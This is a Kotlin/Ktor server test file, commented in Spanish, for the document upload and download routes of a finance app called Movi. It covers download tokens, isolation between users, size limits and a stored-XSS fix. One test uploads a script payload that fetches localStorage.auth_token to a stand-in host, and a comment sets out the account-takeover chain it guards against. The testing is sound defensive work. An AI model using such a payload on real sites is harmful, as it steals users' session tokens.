package com.jvillada.movi.server.routes

import com.auth0.jwt.JWT
import com.auth0.jwt.algorithms.Algorithm
import com.jvillada.movi.server.db.Accounts
import com.jvillada.movi.server.db.Budgets
import com.jvillada.movi.server.db.Credits
import com.jvillada.movi.server.db.Documents
import com.jvillada.movi.server.db.Events
import com.jvillada.movi.server.db.RecurringRules
import com.jvillada.movi.server.db.SmsMessages
import com.jvillada.movi.server.db.StatementImports
import com.jvillada.movi.server.db.Subscriptions
import com.jvillada.movi.server.db.Users
import com.jvillada.movi.server.db.VoidEvents
import com.jvillada.movi.server.plugins.configureRouting
import com.jvillada.movi.server.plugins.configureSerialization
import io.ktor.client.request.delete
import io.ktor.client.request.forms.MultiPartFormDataContent
import io.ktor.client.request.forms.formData
import io.ktor.client.request.get
import io.ktor.client.request.header
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.client.statement.bodyAsText
import io.ktor.http.Headers
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpStatusCode
import io.ktor.server.application.Application
import io.ktor.server.auth.authentication
import io.ktor.server.auth.jwt.JWTPrincipal
import io.ktor.server.auth.jwt.jwt
import io.ktor.server.testing.ApplicationTestBuilder
import io.ktor.server.testing.testApplication
import org.jetbrains.exposed.sql.Database
import org.jetbrains.exposed.sql.SchemaUtils
import org.jetbrains.exposed.sql.insert
import org.jetbrains.exposed.sql.transactions.transaction
import java.util.Date
import kotlin.test.BeforeTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNotNull
import kotlin.test.assertTrue

/**
 * Las pruebas que le faltaban a la parte sensible de Documentos.
 *
 * La primera versión de esta feature se abrió a revisión **sin una sola prueba de servidor**: el
 * token de descarga, el aislamiento entre usuarios y el tope de tamaño se iban a mergear a
 * confianza. La revisión encontró ahí un XSS almacenado que era una toma de cuenta completa, y
 * un camino para tumbar el proceso. Estas pruebas fijan los dos arreglos.
 *
 * Mismo harness que el resto de `routes/`: H2 en memoria + JWT de prueba + `configureRouting()`.
 * El token de DESCARGA no usa el secreto de prueba: lo emite y lo verifica `JwtConfig`, así que
 * el circuito se prueba tal cual corre en producción.
 */
class DocumentRoutesTest {

    private val testSecret = "test-secret-for-document-routes-tests-min-32-chars"
    private val issuer = "movi"
    private val audience = "movi-client"

    private val duenoId = "user-dueno-documentos"
    private val otroId = "user-otro-documentos"

    @BeforeTest
    fun setUp() {
        Database.connect(
            url = "jdbc:h2:mem:document_routes_test;DB_CLOSE_DELAY=-1;MODE=PostgreSQL;DATABASE_TO_LOWER=TRUE",
            driver = "org.h2.Driver",
        )
        transaction {
            SchemaUtils.drop(
                Documents, Subscriptions, Credits, SmsMessages, RecurringRules, VoidEvents,
                Events, StatementImports, Budgets, Accounts, Users,
            )
            SchemaUtils.create(
                Users, Accounts, StatementImports, Events, VoidEvents, Budgets,
                RecurringRules, SmsMessages, Credits, Subscriptions, Documents,
            )
            listOf(duenoId to "dueno@doc.test", otroId to "otro@doc.test").forEach { (uid, mail) ->
                Users.insert {
                    it[id] = uid
                    it[email] = mail
                    it[name] = uid
                    it[passwordHash] = "hash"
                }
            }
        }
    }

    private fun tokenDeSesion(userId: String): String = JWT.create()
        .withIssuer(issuer)
        .withAudience(audience)
        .withClaim("userId", userId)
        .withClaim("email", "$userId@doc.test")
        .withExpiresAt(Date(System.currentTimeMillis() + 30L * 24 * 60 * 60 * 1000))
        .sign(Algorithm.HMAC256(testSecret))

    private fun Application.testModule() {
        configureSerialization()
        val verifier = JWT.require(Algorithm.HMAC256(testSecret))
            .withIssuer(issuer)
            .withAudience(audience)
            .build()
        authentication {
            jwt("jwt") {
                this.verifier(verifier)
                validate { c -> if (c.payload.getClaim("userId").asString() != null) JWTPrincipal(c.payload) else null }
            }
        }
        configureRouting()
    }

    private fun ApplicationTestBuilder.wireApp() = application { testModule() }

    private fun subida(nombre: String, contenido: ByteArray, mime: String) =
        MultiPartFormDataContent(
            formData {
                append("tipo", "EXTRACTO")
                append("file", contenido, Headers.build {
                    append(HttpHeaders.ContentDisposition, "filename=\"$nombre\"")
                    append(HttpHeaders.ContentType, mime)
                })
            },
        )

    /** Sube un documento y devuelve su id, sacado del JSON de respuesta. */
    private suspend fun ApplicationTestBuilder.subir(
        uid: String,
        nombre: String = "extracto.pdf",
        contenido: ByteArray = byteArrayOf(1, 2, 3, 4),
        mime: String = "application/pdf",
    ): String {
        val res = client.post("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(uid)}")
            setBody(subida(nombre, contenido, mime))
        }
        // El cuerpo se lee UNA vez: en `testApplication` es un canal de un solo uso, y pasarlo
        // como mensaje del assert lo consumía antes de que el regex lo mirara.
        val cuerpo = res.bodyAsText()
        assertEquals(HttpStatusCode.Created, res.status, cuerpo)
        return Regex("\"id\"\\s*:\\s*\"([^\"]+)\"").find(cuerpo)?.groupValues?.get(1)
            ?: error("respuesta sin id. status=${res.status} cuerpo=<$cuerpo>")
    }

    private suspend fun ApplicationTestBuilder.enlace(uid: String, docId: String): String {
        val res = client.post("/api/documents/$docId/link") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(uid)}")
        }
        val cuerpo = res.bodyAsText()
        assertEquals(HttpStatusCode.OK, res.status, cuerpo)
        return Regex("\"url\"\\s*:\\s*\"([^\"]+)\"").find(cuerpo)!!.groupValues[1]
    }

    // ── El camino feliz ────────────────────────────────────────────────────────

    @Test
    fun `sube, lista y abre su propio documento`() = testApplication {
        wireApp()
        val id = subir(duenoId, nombre = "Extracto agosto.pdf", contenido = byteArrayOf(9, 8, 7))

        val lista = client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
        }
        assertEquals(HttpStatusCode.OK, lista.status)
        assertTrue("Extracto agosto.pdf" in lista.bodyAsText())

        val res = client.get(enlace(duenoId, id))
        assertEquals(HttpStatusCode.OK, res.status)
        assertEquals(listOf<Byte>(9, 8, 7), res.bodyAsText().toByteArray(Charsets.ISO_8859_1).toList())
    }

    @Test
    fun `la lista no trae los bytes`() = testApplication {
        // Con veinte extractos guardados, traerlos para pintar veinte renglones haría que abrir
        // la pantalla baje decenas de megas. El contenido es reconocible: 200 bytes de 0x41.
        wireApp()
        subir(duenoId, contenido = ByteArray(200) { 0x41 })

        val cuerpo = client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
        }.bodyAsText()

        assertFalse("AAAAAAAAAA" in cuerpo, "la lista no puede incluir el contenido del archivo")
        assertTrue("sizeBytes" !in cuerpo || "\"bytes\":200" in cuerpo)
    }

    // ── El token de descarga ───────────────────────────────────────────────────

    @Test
    fun `sin token no se abre`() = testApplication {
        wireApp()
        val id = subir(duenoId)
        assertEquals(HttpStatusCode.Unauthorized, client.get("/api/documents/$id/content").status)
    }

    @Test
    fun `el token de sesion NO sirve como enlace de descarga`() = testApplication {
        // Es el punto de todo el diseño: si sirviera, la URL que queda en el historial del
        // navegador y en los logs del proxy sería un JWT de 30 días con acceso a toda la cuenta.
        wireApp()
        val id = subir(duenoId)

        val res = client.get("/api/documents/$id/content?t=${tokenDeSesion(duenoId)}")

        assertEquals(HttpStatusCode.Unauthorized, res.status)
    }

    @Test
    fun `el enlace de un documento no abre otro`() = testApplication {
        wireApp()
        val a = subir(duenoId, nombre = "nomina.pdf")
        val b = subir(duenoId, nombre = "escritura.pdf")

        val tokenDeA = enlace(duenoId, a).substringAfter("t=")

        assertEquals(HttpStatusCode.Unauthorized, client.get("/api/documents/$b/content?t=$tokenDeA").status)
    }

    // ── Aislamiento entre usuarios ─────────────────────────────────────────────

    @Test
    fun `otro usuario no ve, no abre y no borra mi documento`() = testApplication {
        wireApp()
        val mio = subir(duenoId, nombre = "escritura Almendros.pdf")

        val suLista = client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(otroId)}")
        }.bodyAsText()
        assertFalse("Almendros" in suLista)

        val suEnlace = client.post("/api/documents/$mio/link") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(otroId)}")
        }
        assertEquals(HttpStatusCode.NotFound, suEnlace.status)

        val suBorrado = client.delete("/api/documents/$mio") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(otroId)}")
        }
        assertEquals(HttpStatusCode.NotFound, suBorrado.status)

        // Y sigue estando: el 404 no puede ser un borrado que además mintió.
        assertEquals(HttpStatusCode.OK, client.get(enlace(duenoId, mio)).status)
    }

    // ── El XSS que encontró la revisión ────────────────────────────────────────

    @Test
    fun `un html subido NO se sirve como html`() = testApplication {
        // La cadena que esto corta: el registro es público, así que un desconocido se registra,
        // sube `extracto.html` declarándolo text/html, pide su enlace y se lo manda al dueño por
        // WhatsApp. Si Movi lo sirviera `inline` con ese tipo, el script correría en el origen de
        // Movi —el mismo que guarda su JWT de 30 días en localStorage— y sería la cuenta entera.
        wireApp()
        val id = subir(
            duenoId,
            nombre = "extracto.html",
            contenido = "<script>fetch('//x/'+localStorage.auth_token)</script>".toByteArray(),
            mime = "text/html",
        )

        val res = client.get(enlace(duenoId, id))

        assertEquals(HttpStatusCode.OK, res.status)
        assertTrue(
            res.headers[HttpHeaders.ContentType]!!.startsWith("application/octet-stream"),
            "un tipo fuera de la lista blanca se sirve como binario opaco",
        )
        assertTrue(
            res.headers[HttpHeaders.ContentDisposition]!!.startsWith("attachment"),
            "y como adjunto, que es la forma de decir «esto no se renderiza acá»",
        )
        assertEquals("nosniff", res.headers["X-Content-Type-Options"])
    }

    @Test
    fun `un svg tampoco, aunque parezca una imagen`() = testApplication {
        // El caso que uno agregaría sin pensar a la lista blanca de imágenes: un SVG ejecuta
        // JavaScript.
        wireApp()
        val id = subir(duenoId, nombre = "logo.svg", contenido = "<svg/>".toByteArray(), mime = "image/svg+xml")

        val res = client.get(enlace(duenoId, id))

        assertTrue(res.headers[HttpHeaders.ContentType]!!.startsWith("application/octet-stream"))
        assertTrue(res.headers[HttpHeaders.ContentDisposition]!!.startsWith("attachment"))
    }

    @Test
    fun `un pdf si se muestra inline, que es para lo que existe la pantalla`() = testApplication {
        wireApp()
        val id = subir(duenoId, nombre = "extracto.pdf", mime = "application/pdf")

        val res = client.get(enlace(duenoId, id))

        assertTrue(res.headers[HttpHeaders.ContentType]!!.startsWith("application/pdf"))
        assertTrue(res.headers[HttpHeaders.ContentDisposition]!!.startsWith("inline"))
        assertEquals("nosniff", res.headers["X-Content-Type-Options"])
    }

    @Test
    fun `el nombre no puede romper el encabezado`() = testApplication {
        wireApp()
        val id = subir(duenoId, nombre = "ext\"racto.pdf")

        val disp = client.get(enlace(duenoId, id)).headers[HttpHeaders.ContentDisposition]

        assertNotNull(disp)
        assertFalse("ext\"racto" in disp, "la comilla se sanea antes de entrar al header")
    }

    // ── El tope de tamaño ──────────────────────────────────────────────────────

    @Test
    fun `un archivo que se pasa del tope se rechaza`() = testApplication {
        wireApp()
        val res = client.post("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
            setBody(subida("gigante.pdf", ByteArray(11 * 1024 * 1024), "application/pdf"))
        }

        assertEquals(HttpStatusCode.PayloadTooLarge, res.status)
        // Y no quedó guardado a medias.
        assertFalse("gigante" in client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
        }.bodyAsText())
    }

    @Test
    fun `borrar el propio documento lo saca de la lista`() = testApplication {
        wireApp()
        val id = subir(duenoId, nombre = "para-borrar.pdf")

        assertEquals(
            HttpStatusCode.NoContent,
            client.delete("/api/documents/$id") {
                header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
            }.status,
        )
        assertFalse("para-borrar" in client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
        }.bodyAsText())
    }
}
